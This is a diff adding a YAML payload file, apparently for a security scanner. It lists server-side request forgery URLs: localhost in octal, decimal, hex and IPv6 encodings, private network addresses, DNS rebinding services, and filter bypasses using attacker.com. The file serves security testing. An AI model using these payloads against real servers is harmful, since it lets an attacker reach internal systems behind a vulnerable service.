@@ -1,0 +1,366 @@
+metadata:
+  type: ssrf/internal
+  version: "1.0"
+  description: "Internal network SSRF payloads"
+  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]
+
+detection_patterns:
+  - "(?i)connection.*?refused"
+  - "(?i)no route to host"
+  - "(?i)connection timed out"
+  - "(?i)network is unreachable"
+
+payloads:
+  localhost:
+    - value: "http://127.0.0.1/"
+      description: "Standard localhost"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://127.0.0.1:80/"
+      description: "Localhost port 80"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://127.0.0.1:443/"
+      description: "Localhost port 443"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://127.0.0.1:8080/"
+      description: "Localhost port 8080"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://127.0.0.1:8443/"
+      description: "Localhost port 8443"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://127.0.0.1:3000/"
+      description: "Localhost port 3000"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://127.0.0.1:5000/"
+      description: "Localhost port 5000"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://127.0.0.1:9090/"
+      description: "Localhost port 9090"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://0.0.0.0/"
+      description: "0.0.0.0 localhost"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://0.0.0.0:80/"
+      description: "0.0.0.0 port 80"
+      severity: high
+      tags: [localhost, ipv4]
+
+    - value: "http://[::1]/"
+      description: "IPv6 localhost"
+      severity: high
+      tags: [localhost, ipv6]
+
+    - value: "http://[::1]:80/"
+      description: "IPv6 localhost port 80"
+      severity: high
+      tags: [localhost, ipv6]
+
+    - value: "http://[0:0:0:0:0:0:0:1]/"
+      description: "Full IPv6 localhost"
+      severity: high
+      tags: [localhost, ipv6]
+
+    - value: "http://[::ffff:127.0.0.1]/"
+      description: "IPv4-mapped IPv6"
+      severity: high
+      tags: [localhost, ipv6]
+
+    - value: "http://[::ffff:7f00:1]/"
+      description: "IPv4-mapped IPv6 hex"
+      severity: high
+      tags: [localhost, ipv6]
+
+    - value: "http://0177.0.0.1/"
+      description: "Octal localhost"
+      severity: high
+      tags: [localhost, octal]
+
+    - value: "http://0177.0.0.01/"
+      description: "Octal localhost variant"
+      severity: high
+      tags: [localhost, octal]
+
+    - value: "http://2130706433/"
+      description: "Decimal localhost"
+      severity: high
+      tags: [localhost, decimal]
+
+    - value: "http://0x7f000001/"
+      description: "Hex localhost"
+      severity: high
+      tags: [localhost, hex]
+
+    - value: "http://0x7f.0x0.0x0.0x1/"
+      description: "Hex dotted localhost"
+      severity: high
+      tags: [localhost, hex]
+
+    - value: "http://127.1/"
+      description: "Short localhost"
+      severity: high
+      tags: [localhost, short]
+
+    - value: "http://127.0.1/"
+      description: "Short localhost 3 octets"
+      severity: high
+      tags: [localhost, short]
+
+    - value: "http://0/"
+      description: "Zero as localhost"
+      severity: high
+      tags: [localhost, short]
+
+    - value: "http://localhost/"
+      description: "Hostname localhost"
+      severity: high
+      tags: [localhost, hostname]
+
+    - value: "http://localhost:80/"
+      description: "Hostname localhost port 80"
+      severity: high
+      tags: [localhost, hostname]
+
+    - value: "http://0x7f000001"
+      description: "Hex without dots"
+      severity: high
+      tags: [localhost, hex]
+
+    - value: "http://127.0.0.1.nip.io/"
+      description: "nip.io DNS wildcard"
+      severity: high
+      tags: [localhost, dns_wildcard]
+
+    - value: "http://localtest.me/"
+      description: "localtest.me DNS"
+      severity: high
+      tags: [localhost, dns_wildcard]
+
+    - value: "http://spoofed.burpcollaborator.net/"
+      description: "Burp collaborator"
+      severity: high
+      tags: [localhost, dns_wildcard]
+
+    - value: "http://127.0.0.1%00@attacker.com/"
+      description: "Null byte bypass"
+      severity: high
+      tags: [localhost, bypass]
+
+    - value: "http://attacker.com@127.0.0.1/"
+      description: "UserInfo bypass"
+      severity: high
+      tags: [localhost, bypass]
+
+    - value: "http://127.0.0.1#@attacker.com/"
+      description: "Fragment bypass"
+      severity: high
+      tags: [localhost, bypass]
+
+  internal_networks:
+    - value: "http://10.0.0.1/"
+      description: "10.0.0.1 Class A"
+      severity: high
+      tags: [internal, class_a]
+
+    - value: "http://10.0.0.0/"
+      description: "10.0.0.0 network"
+      severity: high
+      tags: [internal, class_a]
+
+    - value: "http://10.0.0.2/"
+      description: "10.0.0.2"
+      severity: high
+      tags: [internal, class_a]
+
+    - value: "http://10.10.10.10/"
+      description: "10.10.10.10 common"
+      severity: high
+      tags: [internal, class_a]
+
+    - value: "http://10.100.100.100/"
+      description: "10.100.100.100"
+      severity: high
+      tags: [internal, class_a]
+
+    - value: "http://172.16.0.1/"
+      description: "172.16.0.1 Class B start"
+      severity: high
+      tags: [internal, class_b]
+
+    - value: "http://172.16.0.0/"
+      description: "172.16.0.0 network"
+      severity: high
+      tags: [internal, class_b]
+
+    - value: "http://172.17.0.1/"
+      description: "172.17.0.1 Docker default"
+      severity: high
+      tags: [internal, class_b, docker]
+
+    - value: "http://172.18.0.1/"
+      description: "172.18.0.1"
+      severity: high
+      tags: [internal, class_b]
+
+    - value: "http://172.31.255.255/"
+      description: "172.31.255.255 Class B end"
+      severity: high
+      tags: [internal, class_b]
+
+    - value: "http://192.168.0.1/"
+      description: "192.168.0.1 common router"
+      severity: high
+      tags: [internal, class_c]
+
+    - value: "http://192.168.0.0/"
+      description: "192.168.0.0 network"
+      severity: high
+      tags: [internal, class_c]
+
+    - value: "http://192.168.1.1/"
+      description: "192.168.1.1 common router"
+      severity: high
+      tags: [internal, class_c]
+
+    - value: "http://192.168.1.0/"
+      description: "192.168.1.0 network"
+      severity: high
+      tags: [internal, class_c]
+
+    - value: "http://192.168.100.1/"
+      description: "192.168.100.1"
+      severity: high
+      tags: [internal, class_c]
+
+    - value: "http://192.168.255.255/"
+      description: "192.168.255.255"
+      severity: high
+      tags: [internal, class_c]
+
+  dns_rebinding:
+    - value: "http://rebind.network/"
+      description: "rebind.network service"
+      severity: high
+      tags: [dns_rebinding, service]
+
+    - value: "http://rbndr.us/"
+      description: "rbndr.us service"
+      severity: high
+      tags: [dns_rebinding, service]
+
+    - value: "http://nip.io/"
+      description: "nip.io wildcard DNS"
+      severity: high
+      tags: [dns_rebinding, service]
+
+    - value: "http://sslip.io/"
+      description: "sslip.io wildcard DNS"
+      severity: high
+      tags: [dns_rebinding, service]
+
+    - value: "http://xip.io/"
+      description: "xip.io wildcard DNS"
+      severity: high
+      tags: [dns_rebinding, service]
+
+    - value: "http://127.0.0.1.nip.io/"
+      description: "nip.io localhost"
+      severity: high
+      tags: [dns_rebinding, localhost]
+
+    - value: "http://10.0.0.1.nip.io/"
+      description: "nip.io internal"
+      severity: high
+      tags: [dns_rebinding, internal]
+
+    - value: "http://192.168.1.1.nip.io/"
+      description: "nip.io router"
+      severity: high
+      tags: [dns_rebinding, internal]
+
+    - value: "http://spoofed.burpcollaborator.net/"
+      description: "Burp collaborator"
+      severity: high
+      tags: [dns_rebinding, service]
+
+    - value: "http://canarytokens.com/"
+      description: "Canary tokens"
+      severity: high
+      tags: [dns_rebinding, service]
+
+  ipv6_variations:
+    - value: "http://[::1]/"
+      description: "IPv6 loopback"
+      severity: high
+      tags: [ipv6, localhost]
+
+    - value: "http://[0:0:0:0:0:0:0:1]/"
+      description: "Full IPv6 loopback"
+      severity: high
+      tags: [ipv6, localhost]
+
+    - value: "http://[::ffff:127.0.0.1]/"
+      description: "IPv4-mapped IPv6"
+      severity: high
+      tags: [ipv6, localhost]
+
+    - value: "http://[::ffff:10.0.0.1]/"
+      description: "IPv4-mapped IPv6 internal"
+      severity: high
+      tags: [ipv6, internal]
+
+    - value: "http://[::ffff:192.168.1.1]/"
+      description: "IPv4-mapped IPv6 router"
+      severity: high
+      tags: [ipv6, internal]
+
+    - value: "http://[fd00::1]/"
+      description: "IPv6 ULA"
+      severity: high
+      tags: [ipv6, internal]
+
+    - value: "http://[fe80::1]/"
+      description: "IPv6 link-local"
+      severity: high
+      tags: [ipv6, internal]
+
+    - value: "http://[fc00::1]/"
+      description: "IPv6 ULA fc00"
+      severity: high
+      tags: [ipv6, internal]
+
+    - value: "http://[::ffff:7f00:1]/"
+      description: "IPv6 hex loopback"
+      severity: high
+      tags: [ipv6, localhost]
+
+    - value: "http://[::ffff:c0a8:101]/"
+      description: "IPv6 hex internal"
+      severity: high
+      tags: [ipv6, internal]
+
+    - value: "http://[0:0:0:0:0:ffff:127.0.0.1]/"
+      description: "Full IPv4-mapped"
+      severity: high
+      tags: [ipv6, localhost]
+
+    - value: "http://[::ffff:0:127.0.0.1]/"
+      description: "IPv4-compatible IPv6"
+      severity: high
+      tags: [ipv6, localhost]
